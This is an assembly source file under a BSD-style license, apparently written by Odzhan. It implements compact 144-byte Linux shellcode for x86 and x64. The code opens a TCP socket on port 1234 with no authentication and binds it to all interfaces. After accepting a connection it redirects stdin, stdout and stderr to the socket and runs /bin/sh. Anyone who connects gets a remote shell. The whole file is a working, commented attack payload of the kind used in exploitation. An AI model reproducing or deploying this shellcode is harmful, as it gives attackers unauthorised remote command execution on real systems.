;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;
; 144 byte bind shell
;
; Tested on 32 and 64-bit versions of Linux
;

    bits 32

    ; sa.sin_family = AF_INET;
    ; sa.sin_port   = htons(1234);    
    ; sa.sin_addr   = INANY_ADDR;
    xor     eax, eax
    mov     edx, ~0xD2040002 & 0xFFFFFFFF 
    not     edx    
    push    eax         ; INADDR_ANY, 1234 
    push    edx         ;  
    push    esp         ; ebp = &sa
    pop     ebp
    
    ; step 1, create a socket
    ; x64: socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    ; x86: socketcall(SYS_SOCKET, {AF_INET, SOCK_STREAM, IPPROTO_IP});
    cdq                 ; rdx = IPPROTO_IP
    mov     al, 103     ; eax = sys_socketcall
    push    1
    pop     esi         ; rsi = SOCK_STREAM
    push    2
    pop     edi         ; rdi = AF_INET    
    dec     eax
    jnz     x86_socket  ; jump to x86
    mov     al, 41      ; rax = sys_socket
    syscall
    
    xchg    eax, edi    ; edi=s
    
    ; step 2, bind to port 1234 
    ; bind(sockfd, {AF_INET,1234,INADDR_ANY}, 16)
    push    ebp
    pop     esi
    mov     dl, 16
    mov     al, 49
    syscall
    
    ; step 3, listen
    ; listen(s, 0);
    xor     esi, esi
    mov     al, 50
    syscall
    
    ; step 4, accept connections
    ; accept(s, 0, 0);
    mov     al, 43
    syscall
    
    xchg    eax, edi         ; edi=s
    xchg    eax, esi         ; esi=2
    
    ; step 5, assign socket handle to stdin,stdout,stderr
    ; dup2(r, fileno);
c_dup:
    mov     al, 33               ; rax=sys_dup2
    syscall
    sub     esi, 1
    jns     c_dup       ; jump if not signed   
    jmp     x84_execve
    
x86_socket:
    push    esi         ; save 1
    pop     ebx         ; ebx = SYS_SOCKET
    push    edx         ; IPPROTO_IP
    push    ebx         ; SOCK_STREAM
    push    edi         ; AF_INET
    push    esp             
    pop     ecx         ; ecx = &args 
    int     0x80

    xchg    eax, edi    ; ebx = s

    ; step 2, bind to port 1234
    ; bind (s, &sa, sizeof(sa))
    pop     ebx               ; ebx=2, sys_bind
    pop     esi               ; esi=1
    push    0x10              ; sizeof(sa)
    push    ebp               ; &sa
    push    edi               ; s
    mov     al, 0x66          ; eax=sys_socketcall
    mov     ecx, esp          ; ecx=&args
    int     0x80
    
    mov     [ecx+4], edx      ; clear sa from args
    
    ; step 3, listen for incoming connections
    ; listen (s, 0);
    mov     al, 0x66          ; eax=sys_socketcall
    mov     bl, 4             ; ebx=sys_listen
    int     0x80
    
    ; step 4, accept connections
    ; accept (s, 0, 0);
    mov     al, 0x66          ; eax=sys_socketcall
    inc     ebx               ; ebx=sys_accept
    int     0x80
    
    ; step 5, assign socket to stdin, stdout and stderr
    ; dup2(s, FILENO_STDIN); 
    ; dup2(s, FILENO_STDOUT); 
    ; dup2(s, FILENO_STDERR); 
    push    2
    pop     ecx               ; ecx=2
    xchg    ebx, eax          ; ebx=s
c_dupx86:
    mov     al, 0x3f           ; eax=sys_dup2
    int     0x80
    dec     ecx
    jns     c_dupx86
    ; execve("/bin//sh", NULL, NULL);
x84_execve:
    cdq                 ; envp = NULL
    xor     esi, esi    ; argv = NULL
    push    eax         ; '\0'
    push    eax         ; null space
    push    eax         ; null space
    push    esp
    pop     ebx         ; ebx = "/bin//sh", 0
    push    ebx         ; save pointer to "/bin//sh", 0
    pop     edi         ; rdi = "/bin//sh", 0
    mov     dword[edi+0], '/bin'
    mov     dword[edi+4], '//sh'
    inc     eax
    jnz     x86_execve
    mov     al, 59      ; rax = sys_execve
    syscall
x86_execve:
    xor     ecx, ecx    ; argv = NULL
    mov     al, 11      ; eax  = sys_execve
    int     0x80    
    
